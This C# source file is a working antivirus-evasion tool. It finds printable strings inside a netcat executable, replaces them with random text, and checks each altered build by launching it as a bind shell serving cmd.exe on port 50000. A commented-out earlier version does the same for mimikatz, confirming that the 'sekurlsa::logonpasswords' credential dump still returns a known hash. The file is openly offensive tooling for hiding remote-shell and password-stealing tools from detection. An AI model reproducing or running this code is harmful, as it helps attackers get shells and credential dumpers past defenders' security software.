using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Permissions;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Runtime.ExceptionServices;
//using static System.Net.Mime.MediaTypeNames;

namespace ReplaceString
{
    class Program
    {
        public static void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
        }

        public static void AppDomain_UnhandledException(object sender, System.UnhandledExceptionEventArgs e)
        {
        }
        static IEnumerable<string> SortByLengthDescending(IEnumerable<string> e)
        {
            // Use LINQ to sort the array received and return a copy.
            var sorted = from s in e
                         orderby s.Length descending
                         select s;
            return sorted;
        }

        static string folderPath = @"C:\Tools\NCReplace\AutoReplace\";
        static string exePath = Path.Combine(folderPath, "nc.exe");

        [STAThread]
        [System.Security.Permissions.SecurityPermission(SecurityAction.Demand, Flags = SecurityPermissionFlag.ControlAppDomain)]
        static void Main(string[] args)
        {


            // Unhandled exceptions for our Application Domain
            AppDomain.CurrentDomain.UnhandledException += new System.UnhandledExceptionEventHandler(AppDomain_UnhandledException);


            LogFile UnicodeGoodLog = new LogFile(Path.Combine(folderPath, "UnicodeGood.log"));
            LogFile UnicodeBadLog = new LogFile(Path.Combine(folderPath, "UnicodeBad.log"));
            LogFile AsciiGoodLog = new LogFile(Path.Combine(folderPath, "AsciiGood.log"));
            LogFile AsciiBadLog = new LogFile(Path.Combine(folderPath, "AsciiBad.log"));


            var hexrep = ExeToHex(exePath);

            string replacedHex = hexrep;

            List<string> stringList = new List<string>();
            Dictionary<string, string> myDict = new Dictionary<string, string>();

            var FullUnicodeStrings = SortByLengthDescending(GetUnicodeStringsFromExe()).Where(a => a.Length > 4).Distinct();
            var FullASCIIStrings = SortByLengthDescending(GetAsciiStringsFromExe()).Where(a => a.Length > 4).Distinct();


            //ascii processing
            foreach (var stringToReplace in FullASCIIStrings.Where(a => a.Length > 4))
            {

                Console.WriteLine("testing:  {0}", stringToReplace);
                var result = GenerateString(stringToReplace.Length);

                while (myDict.ContainsValue(result))
                {
                    result = GenerateString(stringToReplace.Length);
                }

                string beforetest = replacedHex;

                replacedHex = ReplaceStringAscii(replacedHex, stringToReplace, result);
                if (!Crash(replacedHex))
                {
                    AsciiGoodLog.WriteToLog(stringToReplace);
                    if (!myDict.ContainsKey(stringToReplace))
                    {
                        myDict.Add(stringToReplace, result);
                    }
                }
                else
                {
                    AsciiBadLog.WriteToLog(stringToReplace);
                    replacedHex = beforetest;
                }
            }
            //Unicode
            //foreach (var stringToReplace in FullUnicodeStrings.Where(a => a.Length > 4))
            //{

            //    Console.WriteLine("testing:  {0}", stringToReplace);
            //    var result = GenerateString(stringToReplace.Length);

            //    while (myDict.ContainsValue(result))
            //    {
            //        result = GenerateString(stringToReplace.Length);
            //    }

            //    string beforetest = replacedHex;

            //    replacedHex = ReplaceStringUnicode(replacedHex, stringToReplace, result);
            //    if (!Crash(replacedHex))
            //    {
            //        UnicodeGoodLog.WriteToLog(stringToReplace);
            //        if (!myDict.ContainsKey(stringToReplace))
            //        {
            //            myDict.Add(stringToReplace, result);
            //        }
            //    }
            //    else
            //    {
            //        UnicodeBadLog.WriteToLog(stringToReplace);
            //        replacedHex = beforetest;
            //    }
            //}







            HexToExe(replacedHex);

            using (StreamWriter file = new StreamWriter(Path.Combine(folderPath, "ReplacmentList.txt")))
                foreach (var entry in myDict)
                    file.WriteLine("WAS {0} CONVERTED TO --> {1}", entry.Key, entry.Value);

        }



        private static ConcurrentBag<string> outputFromProgram = new ConcurrentBag<string>();
        private static ConcurrentBag<string> errorsFromProgram = new ConcurrentBag<string>();
        private static ConcurrentBag<string> worksOK = new ConcurrentBag<string>();

        [HandleProcessCorruptedStateExceptions]
        private static bool Crash(string HexString)
        {
            try
            {
                outputFromProgram = new ConcurrentBag<string>();
                errorsFromProgram = new ConcurrentBag<string>();
                worksOK = new ConcurrentBag<string>();
                HexToExeTestFile(HexString);

                ProcessStartInfo cmdStartInfo = new ProcessStartInfo();
                cmdStartInfo.FileName = Path.Combine(folderPath, "test.exe");
                cmdStartInfo.RedirectStandardOutput = true;
                cmdStartInfo.RedirectStandardError = true;
                cmdStartInfo.RedirectStandardInput = true;
                cmdStartInfo.UseShellExecute = false;
                cmdStartInfo.CreateNoWindow = true;
                cmdStartInfo.Arguments = @"-e C:\windows\system32\cmd.exe -nlvp 50000";

                Process cmdProcess = new Process();

                cmdProcess.StartInfo = cmdStartInfo;
                cmdProcess.ErrorDataReceived += cmd_Error;
                cmdProcess.OutputDataReceived += cmd_DataReceived;
                cmdProcess.EnableRaisingEvents = true;
                cmdProcess.Start();
                cmdProcess.BeginOutputReadLine();
                cmdProcess.BeginErrorReadLine();

                Thread.Sleep(1000);


                if (!cmdProcess.WaitForExit(3000))
                {
                    cmdProcess.Kill();
                    foreach (var stringToCheck in outputFromProgram)
                    {
                        if (!string.IsNullOrEmpty(stringToCheck) && stringToCheck.Contains("listening"))
                        {
                            return false;
                        }
                    }
                    return true;
                }

                if (errorsFromProgram.Count > 1 && !string.IsNullOrEmpty(errorsFromProgram.FirstOrDefault()))
                {
                    return true;
                }
                else
                {
                    foreach (var stringToCheck in outputFromProgram)
                    {
                        if (!string.IsNullOrEmpty(stringToCheck) && stringToCheck.Contains("listening"))
                        {
                            return false;
                        }
                    }
                    return true;
                }
            }
            catch (Exception ex)
            {
                return true;
            }


        }


        static void cmd_DataReceived(object sender, DataReceivedEventArgs e)
        {

            if (e != null && e.Data != null)
            {
                outputFromProgram.Add(e.Data);
            }
        }

        static void cmd_Error(object sender, DataReceivedEventArgs e)
        {
            if (e != null && e.Data != null)
            {
                if (e.Data.Contains("listening"))
                {
                    outputFromProgram.Add(e.Data);
                }
                else
                {
                    errorsFromProgram.Add(e.Data);
                }
            }
        }

        //I left this in here from when I was testing mimikatz.


        //private static bool Crash(string HexSTring)
        //{

        //    bool Crashed = true;
        //    string output = string.Empty;
        //    string error = string.Empty;

        //    try
        //    {
        //        HexToExeTestFile(HexSTring);


        //        //Process processCrashTest = new Process();
        //        //processCrashTest.StartInfo.FileName = @"C:\Tools\AutoReplace\test.exe";
        //        using (Process process = new Process())
        //        {
        //            process.StartInfo.UseShellExecute = false;
        //            process.StartInfo.RedirectStandardOutput = true;
        //            process.StartInfo.RedirectStandardError = true;
        //            process.StartInfo.FileName = @"C:\Tools\AutoReplace\test.exe";
        //            process.EnableRaisingEvents = true;
        //            //process.StartInfo.CreateNoWindow = true;

        //            // Redirects the standard input so that commands can be sent to the shell.
        //            process.StartInfo.RedirectStandardInput = true;

        //            // Runs the specified command and exits the shell immediately.
        //            //process.StartInfo.Arguments = @"/c ""dir""";

        //            try
        //            {
        //                process.Start();
        //                process.StandardInput.WriteLine("privilege::debug");
        //                //string xxx= Console.ReadLine();
        //                //Thread.Sleep(500); ;
        //                using (System.IO.StreamReader myError = process.StandardError)
        //                {
        //                    error = myError.ReadToEnd();
        //                }
        //                using (System.IO.StreamReader myOutput = process.StandardOutput)
        //                {
        //                    output = myOutput.ReadToEnd();
        //                }


        //                if (!string.IsNullOrEmpty(output) && string.IsNullOrEmpty(error) && output.Contains("OK"))
        //                {

        //                    process.StandardInput.WriteLine("sekurlsa::logonpasswords");
        //                    Thread.Sleep(1000);
        //                    using (System.IO.StreamReader myOutput = process.StandardOutput)
        //                    {
        //                        output = myOutput.ReadToEnd();
        //                    }
        //                    using (System.IO.StreamReader myError = process.StandardError)
        //                    {
        //                        error = myError.ReadToEnd();
        //                    }
        //                    if (!string.IsNullOrEmpty(output) && string.IsNullOrEmpty(error) && output.Contains("4224cb01cc5a0a9dd90ed23a8ba390d8"))
        //                    {
        //                        process.StandardInput.WriteLine("exit");
        //                        if (!process.WaitForExit(8000))
        //                        {
        //                            process.Kill();
        //                            return true;
        //                        }
        //                        process.WaitForExit();
        //                        if (process.ExitCode != 0)
        //                        {
        //                            process.Kill();
        //                            Crashed = true;
        //                        }
        //                        else
        //                        {
        //                            process.Close();
        //                            return false;
        //                        }
        //                    }
        //                    else
        //                    {
        //                        process.Kill();
        //                        return true;
        //                    }
        //                }
        //                else
        //                {
        //                    process.Kill();
        //                    return true;
        //                }


        //            }
        //            catch (Exception e)
        //            {
        //                process.Kill();
        //                return true;
        //            }



        //        }
        //    }
        //    catch (Exception e)
        //    {
        //        return true;
        //    }
        //    return Crashed;
        //}



        public static List<string> GetAsciiStringsFromExe()
        {
            List<string> returnList = new List<string>();
            Process compiler = new Process();
            compiler.StartInfo.FileName = Path.Combine(folderPath, "strings64.exe");
            compiler.StartInfo.Arguments = string.Format("-a {0}  /accepteula -nobanner", exePath);
            //compiler.StartInfo.Arguments = @"-a C:\Tools\NCReplace\AutoReplace\nc.exe /accepteula -nobanner";
            compiler.StartInfo.UseShellExecute = false;
            compiler.StartInfo.RedirectStandardOutput = true;
            compiler.Start();

            var AllStringsAsOnVar = compiler.StandardOutput.ReadToEnd();
            string[] lines = AllStringsAsOnVar.Split('\r');


            foreach (var line in lines)
            {
                string result = Regex.Replace(line, @"\r\n?|\n", "");
                if (result.Contains("%"))
                {
                    if (result.Contains(" "))
                    {
                        var possibleParamStrings = result.Split(' ');
                        foreach (var possible in possibleParamStrings)
                        {
                            if (!possible.Contains("%"))
                            {
                                if (!possible.Contains(".dll") && !possible.Contains(".DLL") && !possible.Contains("WATAUAV") && !possible.Contains("logonpasswords") && !possible.Contains("sekurlsa") && !possible.Contains("privilege") && !result.Contains("debug"))
                                {
                                    returnList.Add(possible);
                                }
                            }
                        }
                    }
                }
                else
                {
                    if (!result.Contains(".dll") && !result.Contains(".DLL") && !result.Contains("WATAUAV") && !result.Contains("logonpasswords") && !result.Contains("sekurlsa") && !result.Contains("privilege") && !result.Contains("debug"))
                    {
                        returnList.Add(result);
                    }
                }

            }
            compiler.WaitForExit();
            return returnList;
        }

        public static List<string> GetUnicodeStringsFromExe()
        {
            List<string> returnList = new List<string>();
            Process compiler = new Process();
            compiler.StartInfo.FileName = Path.Combine(folderPath, "strings64.exe");
            compiler.StartInfo.Arguments = string.Format("-u {0} /accepteula -nobanner", exePath);
            //compiler.StartInfo.Arguments = @"-u C:\Tools\NCReplace\AutoReplace\nc.exe /accepteula -nobanner";
            compiler.StartInfo.UseShellExecute = false;
            compiler.StartInfo.RedirectStandardOutput = true;
            compiler.Start();

            var AllStringsAsOnVar = compiler.StandardOutput.ReadToEnd();
            string[] lines = AllStringsAsOnVar.Split('\r');

            foreach (var line in lines)
            {
                string result = Regex.Replace(line, @"\r\n?|\n", "");
                if (result.Contains("%"))
                {
                    if (result.Contains(" "))
                    {
                        var possibleParamStrings = result.Split(' ');
                        foreach (var possible in possibleParamStrings)
                        {
                            if (!possible.Contains("%"))
                            {
                                if (!possible.Contains(".dll") && !possible.Contains(".DLL") && !possible.Contains("WATAUAV") && !possible.Contains("logonpasswords") && !possible.Contains("sekurlsa") && !possible.Contains("privilege") && !result.Contains("debug"))
                                {
                                    returnList.Add(possible);
                                }
                            }
                        }
                    }
                }
                else
                {
                    if (!result.Contains(".dll") && !result.Contains(".DLL") && !result.Contains("WATAUAV") && !result.Contains("logonpasswords") && !result.Contains("sekurlsa") && !result.Contains("privilege") && !result.Contains("debug"))
                    {
                        returnList.Add(result);
                    }
                }

            }
            compiler.WaitForExit();
            return returnList;
        }


        //found code here here https://stackoverflow.com/questions/9995839/how-to-make-random-string-of-numbers-and-letters-with-a-length-of-5


        public const string Alphabet =
        "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        public static string GenerateString(int size)
        {
            Random rand = new Random();
            char[] chars = new char[size];
            for (int i = 0; i < size; i++)
            {
                chars[i] = Alphabet[rand.Next(Alphabet.Length)];
            }
            return new string(chars);
        }
        public static string ExeToHex(string filename)
        {
            var miMimi = System.IO.File.ReadAllBytes(filename);
            //Convert byte-array to Hex-string
            StringBuilder hexBuilder = new StringBuilder();
            foreach (byte b in miMimi)
            {
                string hexByte = b.ToString("X");

                //make sure each byte is represented by 2 Hex digits
                string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                hexBuilder.Append(tempString);
            }

            return hexBuilder.ToString();
        }

        public static string ReplaceStringUnicode(string hexFileInMemory, string find, string replace)
        {
            byte[] ba = Encoding.Unicode.GetBytes(find);

            //var hexString = BitConverter.ToString(ba);
            StringBuilder hexBuilderFind = new StringBuilder();
            foreach (byte b in ba)
            {
                string hexByte = b.ToString("X");

                //make sure each byte is represented by 2 Hex digits
                string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                hexBuilderFind.Append(tempString);
            }


            var search = hexBuilderFind.ToString().Replace("{", "").Replace("}", "");

            var isFound = hexFileInMemory.Contains(search);
            if (isFound)
            {
                byte[] baReplace = Encoding.Unicode.GetBytes(replace);

                //var hexString = BitConverter.ToString(ba);
                StringBuilder hexBuilderReplace = new StringBuilder();
                foreach (byte b in baReplace)
                {
                    string hexByte = b.ToString("X");

                    //make sure each byte is represented by 2 Hex digits
                    string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                    hexBuilderReplace.Append(tempString);
                }
                return hexFileInMemory.Replace(hexBuilderFind.ToString(), hexBuilderReplace.ToString());

            }
            else
            {
                return hexFileInMemory;
            }


        }


        public static string ReplaceStringAscii(string hexFileInMemory, string find, string replace)
        {
            byte[] ba = Encoding.ASCII.GetBytes(find);

            //var hexString = BitConverter.ToString(ba);
            StringBuilder hexBuilderFind = new StringBuilder();
            foreach (byte b in ba)
            {
                string hexByte = b.ToString("X");

                //make sure each byte is represented by 2 Hex digits
                string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                hexBuilderFind.Append(tempString);
            }


            var search = hexBuilderFind.ToString().Replace("{", "").Replace("}", "");

            var isFound = hexFileInMemory.Contains(search);
            if (isFound)
            {
                byte[] baReplace = Encoding.ASCII.GetBytes(replace);

                //var hexString = BitConverter.ToString(ba);
                StringBuilder hexBuilderReplace = new StringBuilder();
                foreach (byte b in baReplace)
                {
                    string hexByte = b.ToString("X");

                    //make sure each byte is represented by 2 Hex digits
                    string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                    hexBuilderReplace.Append(tempString);
                }
                return hexFileInMemory.Replace(hexBuilderFind.ToString(), hexBuilderReplace.ToString());

            }
            else
            {
                return hexFileInMemory;
            }


        }
        public static void HexToExe(string hex)
        {
            //Convert Hex-string from DB to byte-array

            var hexSting = hex;
            int length = hexSting.Length;
            List<byte> byteList = new List<byte>();

            //Take 2 Hex digits at a time
            for (int i = 0; i < length; i += 2)
            {
                byte byteFromHex = Convert.ToByte(hexSting.Substring(i, 2), 16);
                byteList.Add(byteFromHex);
            }
            byte[] byteArray = byteList.ToArray();


            using (System.IO.BinaryWriter srBackToEXE = new System.IO.BinaryWriter(File.OpenWrite(Path.Combine(folderPath, "out.exe"))))
            {

                srBackToEXE.Write(byteArray);
                srBackToEXE.Flush();
            };
        }


        public static void HexToExeTestFile(string hex)
        {



            foreach (var process in Process.GetProcessesByName("test.exe"))
            {
                process.Kill();
            }
            //Convert Hex-string from DB to byte-array

            var hexSting = hex;
            int length = hexSting.Length;
            List<byte> byteList = new List<byte>();

            //Take 2 Hex digits at a time
            for (int i = 0; i < length; i += 2)
            {
                byte byteFromHex = Convert.ToByte(hexSting.Substring(i, 2), 16);
                byteList.Add(byteFromHex);
            }
            byte[] byteArray = byteList.ToArray();


            using (System.IO.BinaryWriter srBackToEXE = new System.IO.BinaryWriter(File.OpenWrite(Path.Combine(folderPath, "test.exe"))))
            {

                srBackToEXE.Write(byteArray);
                srBackToEXE.Flush();
            };
        }
    }


}